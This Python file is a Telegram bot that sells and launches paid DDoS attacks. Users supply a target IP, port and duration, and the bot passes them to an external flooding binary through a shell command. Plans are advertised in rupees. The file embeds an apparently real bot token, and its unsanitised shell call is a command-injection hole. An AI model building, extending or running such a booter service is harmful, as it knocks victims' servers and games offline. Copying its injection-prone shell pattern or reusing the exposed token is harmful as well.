import telebot
import subprocess
import requests
import datetime
import os
import threading
import time
import logging
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup
from telebot import types
import http.server
import socketserver

from keep_alive import keep_alive
keep_alive()
# Insert your Telegram bot token here
bot = telebot.TeleBot('7853841048:AAFprh6fbdzf7qFWlf1F_T4ZI4kA8AMCbXE')

# Admin user IDs
admin_id = ["5926435353"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"

    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ❌."
            else:
                file.truncate(0)
                response = "Logs cleared successfully ✅"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"

    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")


def create_start_keyboard(language):
    keyboard = ReplyKeyboardMarkup(resize_keyboard=True)
    if language == 'EN':
        Attack_button = KeyboardButton('⚔️ START ATTACK ⚔️')
        plan_button = KeyboardButton('BUY PLAN 🛒')
        rules_button = KeyboardButton('RULES ℹ️')
        mylogs_button = KeyboardButton('MY LOGS 📝')
        help_button = KeyboardButton('HELP ❓')
        id_button = KeyboardButton('ID 🆔')
    else:
        Attack_button = KeyboardButton('⚔️ हमला शुरू करें ⚔️')
        plan_button = KeyboardButton('योजना खरीदें 🛒')
        rules_button = KeyboardButton('नियम ℹ️')
        mylogs_button = KeyboardButton('मेरे लॉग्स 📝')
        help_button = KeyboardButton('मदद ❓')
        id_button = KeyboardButton('आईडी 🆔')

    keyboard.add(Attack_button)
    keyboard.row(rules_button, mylogs_button)
    keyboard.row(help_button, id_button)
    keyboard.add(plan_button)
    return keyboard

# Function to create the start keyboard for admin users
def create_admin_keyboard(language):
    keyboard = create_start_keyboard(language)
    if language == 'EN':
        Add_button = KeyboardButton('ADD NEW USER 🆕')
        remove_button = KeyboardButton('REMOVE USER 📛')
        allusers_button = KeyboardButton('ALL USERS 👥')
        logs_button = KeyboardButton('LOGS 📊')
        clearlogs_button = KeyboardButton('CLEAR LOGS 🗑️')
        admincmd_button = KeyboardButton('ADMIN CMD ⚙️')
        Broadcast_button = KeyboardButton('BROADCAST 📢')
    else:
        Add_button = KeyboardButton('नया उपयोगकर्ता जोड़ें 🆕')
        remove_button = KeyboardButton('उपयोगकर्ता निकालें 📛')
        allusers_button = KeyboardButton('सभी उपयोगकर्ता 👥')
        logs_button = KeyboardButton('लॉग्स 📊')
        clearlogs_button = KeyboardButton('लॉग्स साफ करें 🗑️')
        admincmd_button = KeyboardButton('व्यवस्थापक आदेश ⚙️')
        Broadcast_button = KeyboardButton('प्रसारण 📢')

    keyboard.add(KeyboardButton('👑  --- ADMIN COMMANDS ---  👑'))
    keyboard.row(Add_button, remove_button)
    keyboard.row(allusers_button, logs_button)
    keyboard.row(clearlogs_button, admincmd_button)
    keyboard.add(Broadcast_button)
    return keyboard

# Store user languages
user_languages = {}

# Handler for the /start command
@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_id = str(message.chat.id)
    # Ask user to select language
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("English", callback_data="lang_EN"))
    markup.add(InlineKeyboardButton("हिंदी", callback_data="lang_HI"))
    bot.send_message(message.chat.id, "Please select your language / कृपया अपनी भाषा चुनें:", reply_markup=markup)

# Callback handler for language selection
@bot.callback_query_handler(func=lambda call: call.data.startswith("lang_"))
def set_language(call):
    user_id = str(call.message.chat.id)
    language = call.data.split("_")[1]
    user_languages[user_id] = language
    if language == 'EN':
        response = "👋🏻Welcome! Feel Free to Explore.\n\n🤖Please Follow Rules.\n\n✅Join :- @smokeymods"
    else:
        response = "👋🏻स्वागत है! अन्वेषण करने के लिए स्वतंत्र महसूस करें।\n\n🤖कृपया नियमों का पालन करें।\n\n✅जॉइन करें :- @smokeymods"

    if user_id in admin_id:
        keyboard = create_admin_keyboard(language)
    else:
        keyboard = create_start_keyboard(language)

    bot.send_message(call.message.chat.id, response, reply_markup=keyboard)


#-----------------------------------------

@bot.message_handler(func=lambda message: message.text in ['ADD NEW USER 🆕', 'नया उपयोगकर्ता जोड़ें 🆕'])
def add_new_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        language = user_languages.get(user_id, 'EN')
        if language == 'EN':
            msg = bot.send_message(message.chat.id, "Please enter the user ID to authorize:")
        else:
            msg = bot.send_message(message.chat.id, "कृपया अधिकृत करने के लिए उपयोगकर्ता आईडी दर्ज करें:")
        bot.register_next_step_handler(msg, process_new_user)
    else:
        language = user_languages.get(user_id, 'EN')
        if language == 'EN':
            response = "❌ You are not authorized to add new users."
        else:
            response = "❌ आपको नए उपयोगकर्ताओं को जोड़ने का अधिकार नहीं है।"
        bot.send_message(message.chat.id, response)

def process_new_user(message):
    user_id = str(message.chat.id)
    new_user_id = message.text
    if new_user_id in allowed_user_ids:
        language = user_languages.get(user_id, 'EN')
        if language == 'EN':
            response = "User is already authorized."
        else:
            response = "उपयोगकर्ता पहले से ही अधिकृत है।"
        bot.send_message(message.chat.id, response)
    else:
        allowed_user_ids.append(new_user_id)
        with open(USER_FILE, "a") as file:
            file.write(new_user_id + "\n")
        language = user_languages.get(user_id, 'EN')
        if language == 'EN':
            response = "User authorized successfully."
        else:
            response = "उपयोगकर्ता को सफलतापूर्वक अधिकृत किया गया।"
        bot.send_message(message.chat.id, response)

#-----------------------------------------

@bot.message_handler(func=lambda message: message.text in ['REMOVE USER 📛', 'उपयोगकर्ता निकालें 📛'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        language = user_languages.get(user_id, 'EN')
        if language == 'EN':
            msg = bot.send_message(message.chat.id, "Please enter the user ID to remove:")
        else:
            msg = bot.send_message(message.chat.id, "कृपया निकालने के लिए उपयोगकर्ता आईडी दर्ज करें:")
        bot.register_next_step_handler(msg, process_remove_user)
    else:
        language = user_languages.get(user_id, 'EN')
        if language == 'EN':
            response = "❌ You are not authorized to remove users."
        else:
            response = "❌ आपको उपयोगकर्ताओं को निकालने का अधिकार नहीं है।"
        bot.send_message(message.chat.id, response)

def process_remove_user(message):
    user_id = str(message.chat.id)
    remove_user_id = message.text
    if remove_user_id in allowed_user_ids:
        allowed_user_ids.remove(remove_user_id)
        with open(USER_FILE, "w") as file:
            file.write("\n".join(allowed_user_ids))
        language = user_languages.get(user_id, 'EN')
        if language == 'EN':
            response = "User removed successfully."
        else:
            response = "उपयोगकर्ता को सफलतापूर्वक निकाला गया।"
    else:
        language = user_languages.get(user_id, 'EN')
        if language == 'EN':
            response = "User ID not found."
        else:
            response = "उपयोगकर्ता आईडी नहीं मिली।"
    bot.send_message(message.chat.id, response)        

#-----------------------------------------------------


@bot.message_handler(func=lambda message: message.text in ['BROADCAST 📢', 'प्रसारण 📢'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("Click Hear To Enter", callback_data="enter_broadcast_message"))
        bot.send_message(message.chat.id, "Click the button to enter the broadcast message:", reply_markup=markup)
    else:
        language = user_languages.get(user_id, 'EN')
        if language == 'EN':
            response = "Only Admin Can Run This Command 😡."
        else:
            response = "केवल व्यवस्थापक इस कमांड को चला सकते हैं 😡."
        bot.reply_to(message, response)

@bot.callback_query_handler(func=lambda call: call.data == "enter_broadcast_message")
def handle_broadcast_message_input(call):
    user_id = str(call.message.chat.id)
    if user_id in admin_id:
        msg = bot.send_message(call.message.chat.id, "Please enter the broadcast message:")
        bot.register_next_step_handler(msg, process_broadcast_message)
    else:
        language = user_languages.get(user_id, 'EN')
        if language == 'EN':
            response = "Only Admin Can Run This Command 😡."
        else:
            response = "केवल व्यवस्थापक इस कमांड को चला सकते हैं 😡."
        bot.reply_to(call.message, response)

def process_broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        broadcast_msg = message.text
        message_to_broadcast = "⚠️ Message To All Users By Admin:\n\n" + broadcast_msg
        with open(USER_FILE, "r") as file:
            user_ids = file.read().splitlines()
            for user_id in user_ids:
                try:
                    bot.send_message(user_id, message_to_broadcast)
                except Exception as e:
                    print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
        language = user_languages.get(user_id, 'EN')
        if language == 'EN':
            response = "Broadcast Message Sent Successfully To All Users 👍."
        else:
            response = "सभी उपयोगकर्ताओं को सफलतापूर्वक प्रसारित संदेश 👍।"
        bot.reply_to(message, response)
    else:
        language = user_languages.get(user_id, 'EN')
        if language == 'EN':
            response = "Only Admin Can Run This Command 😡."
        else:
            response = "केवल व्यवस्थापक इस कमांड को चला सकते हैं 😡."
        bot.reply_to(message, response)


#----------------------------------------------------

@bot.message_handler(func=lambda message: message.text in ['CLEAR LOGS 🗑️', 'लॉग्स साफ करें 🗑️'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        response = clear_logs()
    else:
        language = user_languages.get(user_id, 'EN')
        if language == 'EN':
            response = "Only Admin Can Run This Command 😡."
        else:
            response = "केवल व्यवस्थापक इस कमांड को चला सकते हैं 😡."
    bot.reply_to(message, response)

#--------------------------------------------------

@bot.message_handler(func=lambda message: message.text in ['ALL USERS 👥', 'सभी उपयोगकर्ता 👥'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response_en = "Authorized Users:\n"
                    response_hi = "अधिकृत उपयोगकर्ता:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response_en += f"- @{username} (ID: {user_id})\n"
                            response_hi += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response_en += f"- User ID: {user_id}\n"
                            response_hi += f"- User ID: {user_id}\n"
                else:
                    response_en = "No data found ❌"
                    response_hi = "कोई डेटा नहीं मिला ❌"
        except FileNotFoundError:
            response_en = "No data found ❌"
            response_hi = "कोई डेटा नहीं मिला ❌"
    else:
        response_en = "Only Admin Can Run This Command 😡."
        response_hi = "केवल व्यवस्थापक इस कमांड को चला सकते हैं 😡."
    
    language = user_languages.get(user_id, 'EN')
    if language == 'EN':
        bot.reply_to(message, response_en)
    else:
        bot.reply_to(message, response_hi)



#------------------------------------------------------------------------------    

@bot.message_handler(func=lambda message: message.text in ['LOGS 📊', 'लॉग्स 📊'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                language = user_languages.get(user_id, 'EN')
                if language == 'EN':
                    response = "No data found ❌."
                else:
                    response = "कोई डेटा नहीं मिला ❌."
                bot.reply_to(message, response)
        else:
            language = user_languages.get(user_id, 'EN')
            if language == 'EN':
                response = "No data found ❌"
            else:
                response = "कोई डेटा नहीं मिला ❌"
            bot.reply_to(message, response)
    else:
        language = user_languages.get(user_id, 'EN')
        if language == 'EN':
            response = "Only Admin Can Run This Command 😡."
        else:
            response = "केवल व्यवस्थापक इस कमांड को चला सकते हैं 😡."
        bot.reply_to(message, response)


#-----------------------------------------------------        

@bot.message_handler(func=lambda message: message.text in ['ID 🆔', 'आईडी 🆔'])
def id_command(message):
    user_id = str(message.chat.id)
    language = user_languages.get(user_id, 'EN')

    if language == 'EN':
        response = f"Your user ID is: {user_id}"
    else:
        response = f"आपकी उपयोगकर्ता आईडी है: {user_id}"

    bot.send_message(message.chat.id, response)

#--------------------------------------------------------------------------------    

# Function to handle the reply when users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name

    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}
COOLDOWN_TIME = 0

# Dictionary to store the state for each user during /bgmi command input
bgmi_state = {}

@bot.message_handler(func=lambda message: message.text == '⚔️ START ATTACK ⚔️' or message.text == '⚔️ हमला शुरू करें ⚔️')
def start_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        bgmi_state[user_id] = {'step': 'target'}
        msg = bot.send_message(message.chat.id, "Enter the target IP:")
        bot.register_next_step_handler(msg, process_bgmi_target)
    else:
        response = "❌ You Are Not Authorized To Use This Command please purchase to use."
        bot.reply_to(message, response)

def process_bgmi_target(message):
    user_id = str(message.chat.id)
    if user_id in bgmi_state:
        bgmi_state[user_id]['target'] = message.text
        bgmi_state[user_id]['step'] = 'port'
        msg = bot.send_message(message.chat.id, "Enter the port:")
        bot.register_next_step_handler(msg, process_bgmi_port)

def process_bgmi_port(message):
    user_id = str(message.chat.id)
    if user_id in bgmi_state:
        bgmi_state[user_id]['port'] = message.text
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton(" 30 seconds", callback_data="bgmi_30"))
        markup.add(InlineKeyboardButton(" 60 seconds", callback_data="bgmi_60"))
        markup.add(InlineKeyboardButton("120 seconds", callback_data="bgmi_120"))
        markup.add(InlineKeyboardButton("180 seconds", callback_data="bgmi_180"))
        markup.add(InlineKeyboardButton("  5 minutes", callback_data="bgmi_300"))
        markup.add(InlineKeyboardButton(" 10 minutes", callback_data="bgmi_600"))
        markup.add(InlineKeyboardButton(" 40 minutes", callback_data="bgmi_2400"))
        bot.send_message(message.chat.id, "Choose the attack duration:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data in ["bgmi_30", "bgmi_60" ,"bgmi_120", "bgmi_180", "bgmi_300", "bgmi_600", "bgmi_2400"])
def handle_bgmi_duration(call):
    user_id = str(call.message.chat.id)
    if user_id in bgmi_state:
        duration = int(call.data.split("_")[1])
        target = bgmi_state[user_id]['target']
        port = bgmi_state[user_id]['port']
        del bgmi_state[user_id]  # Clear the state after using it

        if user_id not in admin_id:
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 0:
                response = "You Are On Cooldown ❌. Please Wait 5min Before Running The /bgmi Command Again."
                bot.send_message(call.message.chat.id, response)
                return
            bgmi_cooldown[user_id] = datetime.datetime.now()

        record_command_logs(user_id, '/bgmi', target, port, duration)
        log_command(user_id, target, port, duration)
        start_attack_reply(call.message, target, port, duration)
        full_command = f"./venompapa {target} {port} {duration} 360"
        subprocess.run(full_command, shell=True)
        response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {duration}"
        bot.send_message(call.message.chat.id, response)

#-------------------------------------------------------------------------------------------------        

@bot.message_handler(func=lambda message: message.text in ['MY LOGS 📝', 'मेरे लॉग्स 📝'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    language = user_languages.get(user_id, 'EN')
                    if language == 'EN':
                        response = "❌ No Command Logs Found For You ❌."
                    else:
                        response = "❌ आपके लिए कोई कमांड लॉग नहीं मिला ❌."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        language = user_languages.get(user_id, 'EN')
        if language == 'EN':
            response = "You Are Not Authorized To Use This Command 😡."
        else:
            response = "आपको इस कमांड का उपयोग करने की अधिकृति नहीं है 😡."
    bot.reply_to(message, response)



#--------------------------------------------------------------


@bot.message_handler(func=lambda message: message.text in ['HELP ❓', 'मदद ❓'])
def help_command(message):
    user_id = str(message.chat.id)
    language = user_languages.get(user_id, 'EN')

    if language == 'EN':
        response = "How can I assist you? Here are some commands you can use:\n\n" \
                   "- /start: Restart the bot and select language\n\n" \
                   "- ⚔️ START ATTACK ⚔️: Initiate an attack\n" \
                   "- BUY PLAN 🛒: Purchase a plan\n" \
                   "- RULES ℹ️: View rules\n" \
                   "- MY LOGS 📝: View your logs\n" \
                   "- ID 🆔: Get your user ID\n"\
                   "-👨🏻‍💻 ADMIN :- @smokeymods"
    else:
        response = "मैं आपकी कैसे मदद कर सकता हूँ? यहाँ कुछ आदेश दिए गए हैं जिनका आप उपयोग कर सकते हैं:\n\n" \
                   "- /start: बॉट को पुनः आरंभ करें और भाषा चुनें\n" \
                   "- ⚔️ हमला शुरू करें ⚔️: हमला शुरू करें\n" \
                   "- योजना खरीदें 🛒: एक योजना खरीदें\n" \
                   "- नियम ℹ️: नियम देखें\n" \
                   "- मेरे लॉग्स 📝: अपने लॉग्स देखें\n" \
                   "- आईडी 🆔: अपनी उपयोगकर्ता आईडी प्राप्त करें\n" \
                   "-👨🏻‍💻 ADMIN :- @smokeymods"

    bot.send_message(message.chat.id, response)    

  
#---------------------------------------------------

@bot.message_handler(func=lambda message: message.text in ['RULES ℹ️', 'नियम ℹ️'])
def welcome_rules(message):
    user_id = str(message.chat.id)
    language = user_languages.get(user_id, 'EN')
    if language == 'EN':
        response = '''⚠️ Please Follow These Rules ⚠️:

1. Don't Run Too Many Attacks!! It Can Lead to a Ban From the Bot.
2. Don't Run 2 Attacks At the Same Time. If You Do, You'll Get Banned From the Bot.
3. We Check the Logs Daily, So Please Follow These Rules to Avoid a Ban!'''
    else:
        response = '''⚠️ कृपया इन नियमों का पालन करें ⚠️:

1. बहुत सारे हमले न चलाएं!! यह बॉट से प्रतिबंधित होने का कारण बन सकता है।
2. एक ही समय में 2 हमले न चलाएं। यदि आप ऐसा करते हैं, तो आपको बॉट से प्रतिबंधित किया जाएगा।
3. हम लॉग्स की नियमित जाँच करते हैं, इसलिए कृपया प्रतिबंध से बचने के लिए इन नियमों का पालन करें!'''
    bot.reply_to(message, response)

@bot.message_handler(func=lambda message: message.text in ['BUY PLAN 🛒', 'योजना खरीदें 🛒'])
def welcome_plan(message):
    user_id = str(message.chat.id)
    language = user_languages.get(user_id, 'EN')
    if language == 'EN':
        response = '''
🌟 VIP Powerful DDoS 🌟 :

-> Attack Time: 180 (S)
-> After Attack Limit: 5 Min
-> Concurrents Attack: 3

------------------------------
💸 Price List 💸 :
------------------------------
💲Day-->100 ₹
💲Week-->400 ₹
💲Month-->800 ₹
💲Season--> 1200 ₹

 DM TO BUY @smokeymods
------------------------------
'''
    else:
        response = '''
🌟 वीआईपी शक्तिशाली डीडोएस 🌟 :

-> हमले का समय: 180 (सेकंड)
-> हमले के बाद सीमा: 5 मिनट
-> समय संगणन: 3

------------------------------
💸 मूल्य सूची 💸 :
------------------------------
💲दिन-->100 ₹
💲सप्ताह-->400 ₹
💲महीना-->800 ₹

 DM TO BUY @smokeymods
------------------------------
'''
    bot.reply_to(message, response)


#------------------------------------------------------------------

@bot.message_handler(func=lambda message: message.text in ['ADMIN CMD ⚙️', 'व्यवस्थापक आदेश ⚙️'])
def admin_commands(message):
    user_id = str(message.chat.id)
    language = user_languages.get(user_id, 'EN')
    if language == 'EN':
        response = '''Admin Commands Are Here!!:

💥 Add a User.
💥 Remove a User.
💥 Authorized Users List.
💥 All Users Logs.
💥 Broadcast a Message.
💥 Clear The Logs File.
'''
    else:
        response = '''व्यवस्थापक आदेश यहाँ हैं!!:

💥 एक उपयोगकर्ता जोड़ें।
💥 एक उपयोगकर्ता हटाएं।
💥 अधिकृत उपयोगकर्ता सूची।
💥 सभी उपयोगकर्ताओं के लॉग।
💥 एक संदेश प्रसारित करें।
💥 लॉग फ़ाइल को साफ करें।
'''
    bot.reply_to(message, response)
#----------------------------------------------------------------

def send_start_command():
    while True:
        try:
            bot.send_message(admin_id[0], 'server running...')
        except Exception as e:
            print(f"Error sending server running... command: {e}")
        time.sleep(60)

# Start the thread to run send_start_command
start_thread = threading.Thread(target=send_start_command)
start_thread.daemon = True  # Ensure it exits when the main program exits
start_thread.start()



#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)


# bot.polling(none_stop=True, timeout=300, long_polling_timeout=60)
